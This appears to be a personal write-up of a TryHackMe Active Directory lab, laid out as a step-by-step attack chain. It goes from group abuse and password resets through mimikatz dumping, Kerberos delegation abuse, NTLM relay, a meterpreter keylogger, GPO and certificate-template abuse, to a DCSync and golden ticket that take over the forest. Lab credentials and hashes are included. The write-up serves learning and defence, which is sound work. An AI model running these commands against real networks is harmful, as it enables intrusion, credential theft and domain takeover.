'''scope
THMCHILDDC - 10.200.83.101
Initial Credentials - http://distributor.za.tryhackme.loc/creds
'''

## Exploitaiton:
- Added the DNS IP address of THMDC in `/etc/systemd/resolved.conf`
- Restarted the service
```bash
systemctl restart systemd-resolved
```

- If this didnt work revert the file `/etc/systemd/resolved.conf` to normal and add the IP in `/etc/resolv.conf` in nameserver
- Got the credentials
	justin.barnes:O8SMjhmo
---------------------------------------------------------------------------------
- Got in using
```bash
ssh za.tryhackme.loc\\justin.barnes@thmwrk1.za.tryhackme.loc
```

- Used `bloodhound-python` to dump `bloodhound` data
- Uploaded on `bloodhound`
- We have RDP permission on THMWRK1
- Checked path for `Tier 2 Admins`
- Found `ForceChangePassword` permission on all Tier 2 Admins from `IT Support` Group
- And anyone can add users to `IT Support` group
- Added our user
```bash
Add-ADGroupMember "IT Support" -Members "justin.barnes"
```

- We can use RPCclient or Powershell to change password now
```bash
# RPCclient method
rpcclient -U "justin.barnes" 10.200.83.101
setuserinfo2 t2_ross.bird 23 password123!

# Powershell method
Get-ADGroupMember -Identity "Tier 2 Admins" # Selected "t2_ross.bird" to change password
$Password = ConvertTo-SecureString "password123!" -AsPlainText -Force
Set-ADAccountPassword -Identity "t2_ross.bird" -Reset -NewPassword $Password
```

- Now we can login using SSH or WinRM
```bash
ssh za.tryhackme.loc\\t2_ross.bird@thmwrk1.za.tryhackme.loc

evil-winrm -i 10.200.83.248 -u 't2_ross.bird' -p 'password123!'
```

- Got in
---------------------------------------------------------------------------------
- Found constrained delegations for `svcIIS` using
```bash
Get-NetUser -TrustedToAuth
```

- We find that svcIIS can delegate http and WSMAN for THMSERVER1
- As we have Admin access now from previous task we can use `mimikatz` to dump secrets
```bash
lsadump::secrets
```

- Found a cleartext password for svcIIS
	svcIIS:Password1@
- We can now use `kekeo` to use this
```bash
tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
```

- Now we can use `kekeo` to forge a TGS for both http and WSMAN
```bash
# http
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_eileen.burton /service:http/THMSERVER1.za.tryhackme.loc

# wsman
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_eileen.burton /service:wsman/THMSERVER1.za.tryhackme.loc
```

- Now we can use `mimikatz` to import them
```bash
# http
kerberos::ptt TGS_t1_eileen.burton@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

# wsman
kerberos::ptt TGS_t1_eileen.burton@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
```

- Now we can use WSMAN to create a new session on the THMSERVER1
```bash
New-PSSession -ComputerName thmserver1.za.tryhackme.loc
Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
```

- Got in
---------------------------------------------------------------------------------
- Found some printers using
```bash
GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
```

- We need certain conditions for printer exploits to work
1. A valid set of AD account credentials.
2. Network connectivity to the target's SMB service.
3. The target host must be running the Print Spooler service.
4. The hosts must not have SMB signing enforced.

- We have checked first three
- We can check if SMB signing is enabled or not using
```bash
nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
```

- We find out it is enabled but not enforced so we can exploit it
- We can use `sppolsample.exe` to force THMSERVER2 to authenticate and then use `ntlmrelayx.py` to relay the authentication to THMSERVER1
- We need to use the IP of THMSERVER1
```bash
impacket-ntlmrelayx -smb2support -t smb://10.200.83.201 -debug
```

- And on THMWRK1 we can use
```bash
.\SpoolSample.exe THMSERVER2.za.tryhackme.loc 10.50.81.121
```

- Dumped hashes
```bash
serverAdmin - 3279a0c6dfe15dc3fb6e9c26dd9b066c
trevor.local - 43460d636f269c709b20049cee36ae7a
```

- Got in
---------------------------------------------------------------------------------
- Found a `PasswordDatabase.kdbx`
- Copied it to my SMB server
```bash
$pass = convertto-securestring "password" -AsPlainText -Force # To convert it to useable password
$cred = New-Object System.Management.Automation.PSCredential('ace', $pass) # Setting up cred object with username and password
New-PSDrive -Name "ace" -PSProvider FileSystem -Credential $cred -Root \\10.50.81.121\share # Connecting the drive to windows
cd ace:
```

- Used a meterpreter shell by creating a reverse shell using msfvenom to use a keylogger so we can intercept the password to database
- We cant start a keylogger using SYSTEM level shell
- Used `ps` and found a process running as `trevor.local`
- Migrated to it
- Started keylogger
```bash
keyscan_start
```

- Dumped the keyscan
- Found password
	Imreallysurenoonewillguessmypassword

- Used keepassx to open the database and extract passwords
	svcServMan:Sup3rStr0ngPass!@
---------------------------------------------------------------------------------
- Dumped bloodhound data
- Found a GenericWrite to `Management Server Pushes` GPO 
- Found a path to THMSERVER2
- We can RDP into THMSERVER1 and edit GPO but that can raise alerts
- We will RDP into THMWRK1 and inject AD credentials that we found
```bash
xfreerdp /v:THMWRK1.za.tryhackme.loc /u:justin.barnes /p:O8SMjhmo +clipboard /dynamic-resolution
```

Now we can use `runas` command to inject our AD creds
```bash
runas /netonly /user:za.tryhackme.loc\svcServMan cmd.exe
```

- To edit GPOs we can use
```bash
mmc
```

- We now want to add the Group Policy Management snap-in:
```
Click File -> Add/Remove Snap-in
Select the Group Policy Management snap-in and click Add
Click Ok
```

- We can now navigate to the GPO that our user has permission to modify (Servers > Management Servers> Management Server Pushes)
- Right click on it and edit
1. Expand **Computer Configuration**
2. Expand **Policies**
3. Expand **Windows Settings**
4. Expand **Security Settings**
5. Right Click on **Restricted Groups** and select **Add Group**
6. Click **Browse,** enter **IT Support** and click **Check Names**
7. Click **Okay** twice

- Now we have access to THMSERVER2 as RDP and Admin
```bash
xfreerdp /v:THMSERVER2.za.tryhackme.loc /u:justin.barnes /p:O8SMjhmo +clipboard /dynamic-resolution
```
---------------------------------------------------------------------------------
- We can find vulnerable certificates using this on THMSERVER2 in RDP session that we have
```bash
certutil -Template -v > templates.txt
```

- Found Template[32] has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set which means we can set our own Subject Alternate Name (SAN)
- Opened `mmc`
- Added the `Certificates` snap-in
- We will request a personal certificate:
```
Right Click on Personal and select All Tasks->Request New Certificate...
Click Next twice to select the AD enrollment policy.
You will see that we have one template that we can request, but first, we need to provide additional information.
Click on the More Information warning.
Change the Subject name Type option to Common Name and provide any value, since it does not matter, and click Add.
Change the Alternative name Type option to User principal name.
Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click Add.
```

- The last step is to export our certificate with the private key:
1. Right-click on the certificate and select **All Tasks**>**Export...**
2. Click **Next**, select **Yes, export the private key**, and click **Next**.
3. Click **Next**, then set a password for the certificate since the private key cannot be exported without a password. (password123!)
4. Click **Next** and select a location to store the certificate.
5. Click **Next** and finally click **Finish.**

- Now we can use `Rubeus` to load the certificate and create a TGT so we can impersonate the user
```bash
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:cryptoace.pfx /password:password123! /outfile:admin_ticket /domain:za.tryhackme.loc /dc:10.200.83.101
```

- Now we can use `mimikatz` to import that ticket
```bash
kerberos::ptt admin_ticket
```

- We can check our ticket using
```bash
kerberos::list
```

- Now we can use WSMAN to create a new session on the THMDC
```bash
New-PSSession -ComputerName THMDC.za.tryhackme.loc
Enter-PSSession -ComputerName THMDC.za.tryhackme.loc
```

- Got in
---------------------------------------------------------------------------------
- We have taken full control of the child domain `za.tryhackme.loc` now we can try to takeover the full domain `tryhackme.loc`
- We can create a golden ticket using `mimikatz`
- We need the `krbtgt` user hash
- Dumped it using `mimikatz`
```bash
lsadump::dcsync /user:za\krbtgt
```

- Found it
```bash
16f9af38fca3ada405386b3b57366082
````

- To create Golden Tickets
```bash
kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:<SID of Child Domain> /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:<SID of Enterprise Admins group> /ptt
```

- We can get SIDs using
```bash
# Child domain SID
Get-ADComputer -Identity "THMDC"

# Enterprise Admin SID
Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
```

- Creating Golden Tickets
```bash
kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt
```

- Now we can verify that it works using
```bash
dir \\thmrootdc.tryhackme.loc\c$\
```

- And we now own the entire forest